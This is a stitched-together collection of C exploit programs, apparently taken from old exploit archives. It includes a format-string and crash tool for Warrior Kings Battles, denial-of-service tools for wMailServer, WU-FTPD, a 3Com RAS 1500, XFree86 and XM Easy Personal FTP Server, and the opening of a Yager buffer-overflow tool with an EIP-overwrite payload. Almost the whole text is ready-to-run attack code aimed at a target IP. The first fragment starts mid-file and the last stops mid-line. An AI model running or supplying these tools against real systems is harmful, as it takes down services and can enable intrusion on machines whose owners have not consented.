u_char *char2uni(u_char *in, int inlen, u_char *out);
u_short show_info(u_char *data, int len, int *maj, int *min);
int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    int     sd,
            len,
            vermaj = 0,
            vermin = 0,
            attack;
    u_short port = PORT;
    u_char  buff[BUFFSZ + 1],
            nick[NICKSIZE + 1],
            info[] =
                "\xfe\xfd" "\x00" "\x00\x00\x00\x00" "\xff\x00\x00",
            *psdk,
            *p;

#pragma pack(1) // a basic header (only sign and type remain the same)
    struct gssdk_header {
        u_short sign;
        u_char  type;
        u_short gs1;
        u_short gs2;
    } *gh;
#pragma pack()

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Warrior Kings Battles <= 1.23 format string and crash bugs "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%d)]\n"
            "\n"
            "Attack:\n"
            " 1 = format string bug (partially in-game)\n"
            " 2 = crash through incomplete packet\n"
            "\n"
            " Port is the query port, anyway the program automatically recognizes if what\n"
            " you specify is the info or the data port\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);
    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    gh = (struct gssdk_header *)buff;

    fputs("- request informations:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    *(u_int *)(info + 3) = ~time(NULL);
    len = send_recv(sd, info, sizeof(info) - 1, buff, BUFFSZ);

    if(gh->sign == 0xfefe) {
        peer.sin_port = htons(++port);
        printf("- the port you have specified is the data port, I try with %d\n",
            port);
        len = send_recv(sd, info, sizeof(info) - 1, buff, BUFFSZ);
    }
    close(sd);

    buff[len] = 0x00;
    port = show_info(buff, len, &vermaj, &vermin);
    peer.sin_port = htons(port);
    printf("\n"
        "- set server port %hu\n"
        "- set version %d.%d\n",
        port,
        vermaj, vermin);

    psdk = buff + 7;
    memset(nick, 0x00, NICKSIZE);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    gh->sign = htons(0xfefe);
    gh->type = 1;
    gh->gs1  = htons(0);
    gh->gs2  = htons(0);
    memset(psdk, '0', 32);
    gssdkcr(psdk, psdk, 0);

    len = send_recv(sd, buff, 39, buff, BUFFSZ);
    buff[len] = 0x00;
    if((gh->type != 2) || (ntohs(gh->gs1) != 0) || (ntohs(gh->gs2) != 1)) {
        fputs("  the first packet doesn't seem to have been accepted, I continue\n", stdout);
    }

    gh->sign = htons(0xfefe);
    gh->type = 3;
    gh->gs1  = htons(1);
    gh->gs2  = htons(1);
    gssdkcr(psdk, buff + 39, 0);
    p = psdk + 32;

    if(attack == 1) {
        ADDSHORT(0xffff);
        strcpy(nick, "%n%n%n%n%n");
        p = char2uni(nick, NICKSIZE, p);    // fixed size
        ADDSHORT(0xffff);
        *p++ = vermaj;
        *p++ = vermin;

        fputs("- send format string data\n", stdout);
        len = send_recv(sd, buff, p - buff, buff, BUFFSZ);
        for(;;) {
            if((gh->type == 4) || (gh->type == 5)) break;
            if(timeout(sd) < 0) break;
            RECV(buff, BUFFSZ);
        }

        if(gh->type != 4) {
            buff[len] = 0x00;
            printf("\n"
                "Error: packet not accepted for the following reason:\n"
                "\n"
                " %s\n"
                "\n", buff + 7);
            exit(1);
        }
    } else {
        fputs("- send partial packet\n", stdout);
        SEND(buff, p - buff);
    }
    close(sd);

    sleep(ONESEC);
    fputs("- check server:\n", stdout);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    gh->sign = htons(0xfefe);
    gh->type = 1;
    gh->gs1  = htons(0);
    gh->gs2  = htons(0);
    memset(psdk, '0', 32);
    gssdkcr(psdk, psdk, 0);

    SEND(buff, p - buff);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable but check it manually\n\n", stdout);
    }

    close(sd);
    return(0);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz) {
    int     i,
            len;

    for(i = 3; i; i--) {        
        SEND(in, insz);
        if(!timeout(sd)) break;
    }

    if(!i) {
        fputs("\nError: socket timeout, no reply received\n\n", stdout);
        exit(1);
    }

    RECV(out, outsz);
    return(len);
}



u_char *char2uni(u_char *in, int inlen, u_char *out) {
    while(inlen--) {
        *out++ = *in++;
        *out++ = 0x00;
    }
    return(out);
}



u_short show_info(u_char *data, int len, int *maj, int *min) {
    int     nt = 0,
            d,
            portfound = -1,
            verfound  = -1;
    u_short port = 0;
    u_char  *limit = data + len;

    fputc('\n', stdout);
    data += 5;
    while(data < limit) {
        d = strlen(data);
        if(nt & 1) {
            if(!portfound) {
                port = atoi(data);
                portfound++;
            }
            if(!verfound) {
                sscanf(data, "%d.%d", maj, min);
                verfound++;
            }
            printf("%s\n", data);
        } else {
            if(!d) break;
            if((portfound < 0) && !strcmp(data, "hostport")) portfound++;
            if((verfound < 0) && !strcmp(data, "gamever")) verfound++;
            printf("%30s: ", data);
        }
        data += d + 1;
        nt++;
    }
    return(port);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*****************************************************************

wMailServer Remote D.o.S Exploit by Kozan

Application: wMailServer
Vendor: Softiacom Software - www.softiacom.com

Discovered by: fRoGGz - SecuBox Labs
Exploit Coded by: Kozan
Credits to ATmaCA, fRoGGz, SecuBox Labs
Web: www.spyinstructors.com
Mail: kozan@spyinstructors.com

*****************************************************************/

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib,"ws2_32.lib")

char Buff[] =
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char *argv[])
{
       fprintf(stdout, "wMailServer Remote D.o.S Exploit by Kozan\n");
       fprintf(stdout, "Discovered by: fRoGGz - SecuBox Labs\n");
       fprintf(stdout, "Exploit Coded by: Kozan\n");
       fprintf(stdout, "Credits to ATmaCA, fRoGGz, SecuBox Labs\n\n");
       fprintf(stdout, "www.spyinstructors.com - kozan@spyinstructors.com\n");

       if(argc<2)
       {
               fprintf(stderr, "\n\nUsage: %s [Target IP]\n\n", argv[0]);
               return -1;
       }
       WSADATA wsaData;
       SOCKET sock;

       if( WSAStartup(0x0101,&wsaData) < 0 )
       {
               fprintf(stderr, "Winsock error!\n");
               return -1;
       }

       sock = socket(AF_INET,SOCK_STREAM,0);
       if( sock == -1 )
       {
               fprintf(stderr, "Socket error!\n");
               return -1;
       }

       struct sockaddr_in addr;

       addr.sin_family = AF_INET;
       addr.sin_port = htons(25);
       addr.sin_addr.s_addr = inet_addr(argv[1]);
       memset(&(addr.sin_zero), '\0', 8);

       if( connect( sock, (struct sockaddr*)&addr, sizeof(struct sockaddr) ) == -1 )
       {
               fprintf(stderr, "Connection failed!\n");
               closesocket(sock);
               return -1;
       }

       if( send(sock,Buff,strlen(Buff),0) == -1 )
       {
               fprintf(stderr, "DoS string could not sent!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Operation completed...\n");
       closesocket(sock);
       WSACleanup();

       return 0;
}

// milw0rm.com [2005-07-12]
/*
*     (c) Rosiello Security
*
* Copyright Rosiello Security 2003
*   All Rights reserved.
*
* Tested on Red Hat 9.0
*
* Author: Angelo Rosiello
* Mail  : angelo rosiello org
* This software is only for educational purpose.
* Do not use it against machines different from yours.
* Respect law.
*
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

void addr_initialize( );
void usage( );

int main( int argc, char **argv )
{
	int i, sd, PORT, loop, error;
	char user[30], password[30], ch;
	struct sockaddr_in server_addr;

        fprintf( stdout, "\n(c) Rosiello Security 2003\n" );
        fprintf( stdout, "http://www.rosiello.org\n" );
        fprintf( stdout, "WU-FTPD 2.6.2 Freezer by Angelo Rosiello\n\n" );

	if( argc != 6 ) usage( argv[0] );

	if( strlen( argv[3] ) > 20 ) exit( 0 );
	if( strlen( argv[4] ) > 20 ) exit( 0 );

	sprintf( user, "USER %s\n", argv[3] );
	sprintf( password, "PASS %s\n", argv[4] );

	PORT = atoi( argv[2] );
	loop = atoi( argv[5] );

	addr_initialize( &server_addr, PORT, ( long )inet_addr( argv[1] ));
	sd = socket( AF_INET, SOCK_STREAM, 0 );

  	error = connect( sd, ( struct sockaddr * ) &server_addr, sizeof( server_addr ));
	if( error != 0 )
	{
		perror( "Something wrong with the connection" );
		exit( 0 );
	}

	while ( ch != '\n' )
        {
                recv( sd, &ch, 1, 0);
                printf("%c", ch );
        }

	ch = '\0';

	printf( "Connection executed, now waiting to log in...\n" );

	printf( "%s", user );

	send( sd, user, strlen( user ), 0 );
	while ( ch != '\n' )
	{
		recv( sd, &ch, 1, 0);
		printf("%c", ch );
	}
	printf( "%s", password );

	ch = '\0';

 	send( sd, password, strlen( password ), 0 );
        while ( ch != '\n' )
        {
                recv( sd, &ch, 1, 0);
                printf("%c", ch );
        }

	printf( "Sending the DoS query\n" );
	for( i=0; i<loop; i++ )
	{
		write( sd, "LIST -w 1000000 -C\n", 19 );
	}
	printf( "All done\n" );
	close( sd );
	return 0;
}

void addr_initialize (struct sockaddr_in *address, int port, long IPaddr)
{
     	address -> sin_family = AF_INET;
     	address -> sin_port = htons((u_short)port);
     	address -> sin_addr.s_addr = IPaddr;
}

void usage( char *program )
{
	fprintf(stdout, "USAGE: <%s> <IP> <PORT> <USER> <PASS> <LOOP>\n", program);
  	exit(0);
}


// milw0rm.com [2003-10-31]
/*
 * wu-ftpd <= 2.6.2 File Globbing DoS 
 * str0ke@milw0rm.com
 * 
 * Advisory: http://www.idefense.com/application/poi/display?id=207&type=vulnerabilities&flashstatus=true
 *
 * Adam Zabrocki (pi3 / pi3ki31ny) is credited with this discovery.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>

#define SERVER_PORT 21
usage(char *name)
{
printf("usage: %s -h hostname/ip -u user -p passwd\n",name);
printf("\t\t/str0ke!milw0rm.com wu-ftpd <= 2.6.2 File Globbing DoS\n");
exit(0);
}

main(int argc, char *argv[]) {
 char buffer[1000],host[255],user[255],pass[255],c;
 int sd, rc, i=0;
 struct sockaddr_in localAddr, servAddr;
 struct hostent *h;

if ( argc < 3) {
usage(argv[0]);
}

while ((c = getopt (argc, argv, "h:u:p:")) != EOF)
       switch(c)
       {
               case 'h':
                       strncpy(host,optarg,sizeof(host));
                       break;
               case 'u':
                       strncpy(user,optarg,sizeof(user));
                       break;
               case 'p':
                       strncpy(pass,optarg,sizeof(pass));
                       break;
       }

while(1) {

 h = gethostbyname(host);
 if(h==NULL) {
   printf("unknown host '%s'\n",host);
   exit(1);
 }

 servAddr.sin_family = h->h_addrtype;
 memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
 servAddr.sin_port = htons(SERVER_PORT);
 sd = socket(AF_INET, SOCK_STREAM, 0);
 if(sd<0) {
   perror("cannot open socket ");
   exit(1);
 }

 localAddr.sin_family = AF_INET;
 localAddr.sin_addr.s_addr = htonl(INADDR_ANY);
 localAddr.sin_port = htons(0);

 rc = bind(sd, (struct sockaddr *) &localAddr, sizeof(localAddr));
 if(rc<0) {
   printf("%d: cannot bind port TCP %u\n",sd,SERVER_PORT);
   perror("error ");
   exit(1);
 }

 printf("Trying To Connect To [%s]\n",host);
 rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
 if(rc<0) {
   perror("cannot connect ");
   exit(1);
 }
   printf("Trying Login With [%s]\n",user);
   snprintf(buffer,sizeof(buffer), "USER %s\r\n", user);
   rc = send(sd, buffer, strlen(buffer), 0);
   memset(buffer,0,sizeof(buffer));

while(1)
       {
       rc=recv(sd,buffer,sizeof(buffer),0);
       if(strstr(buffer,"331")) break;
       if(strstr(buffer,"421"))
               {
               printf("Access Denied on your arse..\n");
               exit(0);
               }
       }

   printf("Sending Pass - [%s]\n",pass);
   memset(buffer,0,sizeof(buffer));
   snprintf(buffer,sizeof(buffer), "PASS %s\r\n", pass);
   rc = send(sd,buffer, strlen(buffer), 0);

while(1)
       {
       rc=recv(sd,buffer,sizeof(buffer),0);
       if(strstr(buffer,"230")) break;
       if(strstr(buffer,"421"))
               {
               printf("Access Denied on your arse..\n");
               exit(0);
               }

       if(strstr(buffer,"530"))
               {
               printf("Access Denied: Login Incorrect!\n");
               exit(0);
               }
}

   memset(buffer,0,sizeof(buffer));
   snprintf(buffer,sizeof(buffer), "LIST ***********************************************************************************************************************************************************************************************.*\r\n");
   rc = send(sd,buffer, strlen(buffer), 0);
   printf("Dos Sent\n");

}

   if(rc<0) {
     perror("cannot send data ");
     close(sd);
     exit(1);
   }
return 0;
}

// milw0rm.com [2005-02-25]
source: http://www.securityfocus.com/bid/14536/info

Winterm 1125SE is affected by a remote denial of service vulnerability. This issue is due to the application failing to handle exceptional conditions in a proper manner.

The problem occurs when processing packets with malformed IP headers. A successful attack causes the application to crash, denying service to legitimate users. 

/*
 * 3com superstack II RAS 1500 remote Denial of Service
 *
 * Piotr Chytla <pch@isec.pl>
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
 *
 * (c) 2003 Copyright by iSEC Security Research
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <libnet.h>
#define OPT_LEN 4
void usage()
{
  printf("Args: \n");
  printf("-s [source address]\n");
  printf("-d [destination address]\n");
}

int main(int argc,char *argv[])
{
 char a;
 int sock,r;
 u_long src;
 u_long dst;
 char pktbuf[IP_MAXPACKET];
 char payload[]="ABCDEFGHIJKLMNOPRST";
 u_char options[4];
 struct ipoption ipopt;
 bzero(options,OPT_LEN);
 while((a=getopt(argc,argv,"d:s:h?"))!=EOF)
 {
     switch(a) {
         case 'h' : { usage(); exit(1); }
         case 's' : { src=libnet_name_resolve(optarg,0); break;}
         case 'd' : { dst=libnet_name_resolve(optarg,0); break;}
        }
 }
 sock = libnet_open_raw_sock(IPPROTO_RAW);
 if (sock<0)
 {
 perror("socket");
 exit(1);
 }

 libnet_build_ip(strlen(payload),0,0x1337,0,255,0xaa,src,dst,payload,strlen(payload),pktbuf);
  memcpy(ipopt.ipopt_list, options, OPT_LEN);
  *(ipopt.ipopt_list)     = 0xe4;
  *(ipopt.ipopt_list+1)   = 0;
  *(ipopt.ipopt_list+1)   = 0;
  *(ipopt.ipopt_list+1)   = 0;
  r=libnet_insert_ipo(&ipopt,OPT_LEN,pktbuf);
  if (r <0)
   {
        libnet_close_raw_sock(sock);
        printf("Error ip options insertion failed\n");
        exit(1);
   }
  r=libnet_write_ip(sock,pktbuf,LIBNET_IP_H+OPT_LEN+strlen(payload));
  if (r<0)
  {
   libnet_close_raw_sock(sock);
   printf("Error write_ip \n");
   exit(1);
  }
 libnet_close_raw_sock(sock);
 return 0;
}

source: http://www.securityfocus.com/bid/1235/info

A denial of service exists in XFree86 3.3.5, 3.3.6 and 4.0. A remote user can send a malformed packet to the TCP listening port, 6000, which will cause the X server to be unresponsive for some period of time. During this time, the keyboard will not respond to user input, and in some cases, the mouse will also not respond. During this time period, the X server will utilize 100% of the CPU, and can only be repaired by being signaled. This vulnerability exists only in servers compiled with the XCSECURITY #define set. This can be verified by running the following:
strings /path/to/XF86_SVGA | grep "XC-QUERY-SECURITY-1"

To quote the Bugtraq post, by Chris Evans <chris@ferret.lmh.ox.ac.uk>:
"Observe xc/programs/Xserver/os/secauth.c, AuthCheckSitePolicy():

// dataP is user supplied data from the network
char *policy = *dataP;
int nPolicies;
...
// Oh dear, we can set nPolicies to -1
nPolicies = *policy++;
while (nPolicies) {
// Do some stuff in a loop
...
nPolicies--;
}

So, the counter "nPolicies", if seeded with -1, will decrement towards
about minus 2 billion, then wrap to become positive 2 billion, and head
towards its final destination of 0." 

/* bust_x.c
 * Demonstration purposes only!
 * Chris Evans <chris@scary.beasts.org>
 */
int
main(int argc, const char* argv[])
{
  char bigbuf[201];
  short s;
  char c;

  c = -120;

  memset(bigbuf, c, sizeof(bigbuf));

  /* Little endian */
  c = 'l';
  write(1, &c, 1);
  /* PAD */
  c = 0;
  write(1, &c, 1);
  /* Major */
  s = 11;
  write(1, &s, 2);
  /* Minor */
  s = 0;
  write(1, &s, 2);
  /* Auth proto len */
  s = 19;
  write(1, &s, 2);
  /* Auth string len */
  s = 200;
  write(1, &s, 2);

  /* PAD */
  s = 0;
  write(1, &s, 2);

  /* Auth name */
  write(1, "XC-QUERY-SECURITY-1", 19);

  /* byte to round to multiple of 4 */
  c = 0;
  write(1, &c, 1);

  /* Auth data */
  /* Site policy please */
  c = 2;
  write(1, &c, 1);
  /* "permit" - doesn't really matter */
  c = 0;
  write(1, &c, 1);
  /* number of policies: -1, loop you sucker:) */
  c = -1;
  write(1, &c, 1);
  /* Negative stringlen.. 201 of them just in case, chortle... */

  write(1, bigbuf, sizeof(bigbuf));
}
/*
XM Easy Personnal FTP Server <= 5.7.0
Remote Denial of Service with Request (NLST)

---------------------------------------------------------------------------------------------------------
The vulnerability is caused due to an error in handling the NLST command. This can be exploited to crash 
the FTP service by sending the "NLST" with NULL argument.
---------------------------------------------------------------------------------------------------------

Author: Jonathan Salwan
Mail  : submit [AT] shell-storm.org
Web   : http://www.shell-storm.org
*/

#include "stdio.h"
#include "unistd.h"
#include "stdlib.h"
#include "sys/types.h"
#include "sys/socket.h"
#include "netinet/in.h"

int syntax(char *file)
	{
	fprintf(stderr,"XM Easy Personnal FTP Server <= 5.7.0\n");
	fprintf(stderr,"=>Syntax  : <%s> <ip> <port> <login> <passwd>\n",file);
	fprintf(stdout,"=>Exemple : %s 127.0.0.1 21 login1 password1\n",file); 
	exit(0);
	}

int main(int argc, char **argv)
{
	if (argc < 4)
		syntax(argv[0]);
	
	int port = atoi(argv[2]);

	int mysocket;
	int mysocket2;
	int srv_connect;
	int sockaddr_long;


		struct sockaddr_in sockaddr_mysocket;
		sockaddr_long = sizeof(sockaddr_mysocket);
		sockaddr_mysocket.sin_family = AF_INET;
		sockaddr_mysocket.sin_addr.s_addr = inet_addr(argv[1]);
		sockaddr_mysocket.sin_port = htons(port);

        char request[50];
	char answer[200];

        fprintf(stdout,"[+]Connect to Server %s\n",argv[1]);

                mysocket2 = socket(AF_INET, SOCK_STREAM, 0);
                        if(mysocket2 == -1){
                        fprintf(stderr,"[-]FAILED SOCKET\n");
			return 1;}

	srv_connect = connect(mysocket2, (struct sockaddr*)&sockaddr_mysocket, sockaddr_long);
		
	if (srv_connect != -1)
 		{	

                memset(answer,0,200);
	        recv(mysocket2,answer,sizeof(answer),0);

		sprintf(request, "USER %s\r\n", argv[3]);		
			if (send(mysocket2,request,strlen(request),0) == -1){
				fprintf(stderr,"[-]Send Request USER\t\t[FAILED]\n");
				shutdown(mysocket2,1);
				return 1;}
			else{
				memset(answer,0,200);
				recv(mysocket2,answer,sizeof(answer),0);
				}
		
		sprintf(request, "PASS %s\r\n", argv[4]);
		                if (send(mysocket2,request,strlen(request),0) == -1){
		                        fprintf(stderr,"[-]Send Request PASS\t\t[FAILED]\n");
		                        shutdown(mysocket2,1);
		                        return 1;}
		                else{ 
					memset(answer,0,200);
		                        recv(mysocket2,answer,sizeof(answer),0);
		                 }
                sprintf(request, "NLST\r\n");
                        if (send(mysocket2,request,strlen(request),0) == -1){
                                fprintf(stderr,"[-]Send Request NLST\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
			
		}
	else{
		fprintf(stderr,"[-]Connect\t\t[FAILED]\n");
		shutdown(mysocket2,1);
		return 1;}


	shutdown(mysocket2,1);


fprintf(stdout,"[+]Done! %s has been Crashed\n", argv[1]);
return 0;
}

// milw0rm.com [2009-03-27]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define BUFFSZ      (HEADSZ + 65536)
#define PORT        34855
#define TIMEOUT     3
#define HEADSZ      10
#define EIP         "\xde\xc0\xad\xde"
#define CRASHSZ     100
#define NICKBOF     "\x00\x00\x00\x00"      /* vehicle type */ \
                    "\x01\x00\x00\x00"      /* team */ \
                    "\xff\xff\xff\xff"      /* nickname size, ignored! */ \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    EIP \
                    "aaaaaaaaaaaaaaaa\0"
#define PCKBOF      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aa" EIP

#define SHOW(x)     printf(x "%n%s%n\n", &tmp, p, &len); \
                    p += (len - tmp) + 1;
#define SENDTO(x)   if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();
#define RECVFROM    if(timeout(sd) < 0) { \
                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
                        exit(1); \
                    } \
                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len < 0) std_err();
#define SEND(x,y)   if(send(sd, x, y, 0) \
                      < 0) std_err();



u_long resolv(char *host);
int timeout(int sock);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack,
            tmp,
            autoport = 1;
    u_short port = PORT;
    u_char  *buff,
            info[] =
                "Y_NET_YAGER_CLIENT\0"
                "\x00\x00" "\x00\x00",
            *p;
    struct yager_head {
        u_long  type;
        u_short size;
        u_short pck1;
        u_short pck2;
    } *yh;


    setbuf(stdout, NULL);

    fputs("\n"
